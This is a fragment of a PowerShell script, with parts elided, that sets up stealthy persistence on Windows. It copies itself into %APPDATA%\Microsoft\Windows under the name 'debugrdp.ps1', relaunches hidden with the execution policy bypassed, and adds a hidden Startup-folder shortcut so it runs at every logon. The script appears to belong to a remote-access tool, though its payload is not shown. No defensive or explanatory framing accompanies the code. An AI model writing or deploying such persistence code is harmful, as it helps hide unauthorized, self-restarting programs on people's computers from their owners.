# --- Self-persistence: ensure script is saved to disk and run from %APPDATA%\Microsoft\Windows\debugrdp.ps1 ---
$persistPath = "$env:APPDATA\Microsoft\Windows\debugrdp.ps1"
if ($MyInvocation.MyCommand.Definition -ne $persistPath) {
    Copy-Item -Path $MyInvocation.MyCommand.Definition -Destination $persistPath -Force
    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistPath`"" -WindowStyle Hidden
    exit
}
...
# --- New: Create Startup shortcut to launch this PowerShell script (hidden) ---
...
try {
    ...
    $shortcut.Save()
    Log "Created hidden PowerShell script shortcut in Startup folder: $shortcutPath"
} catch {
    Log "Failed to create hidden PowerShell Startup shortcut: $_"
}
